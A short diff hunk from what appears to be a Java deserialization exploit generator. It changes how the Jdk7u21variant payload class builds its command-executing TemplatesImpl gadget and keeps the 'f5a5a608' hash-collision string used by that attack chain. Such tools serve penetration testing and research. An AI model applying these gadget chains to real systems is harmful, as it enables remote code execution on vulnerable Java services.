@@ -22,7 +22,7 @@ public class Jdk7u21variant implements CommandObjectPayload<Object>
 	@Override
 	public Object getObject(String command) throws Exception {
 
-		Object templates = Gadgets.createTemplatesImpl(command);
+		Object templates = Gadgets.createTemplates4Cmd(command);
 
 		String zeroHashCodeStr = "f5a5a608";
 
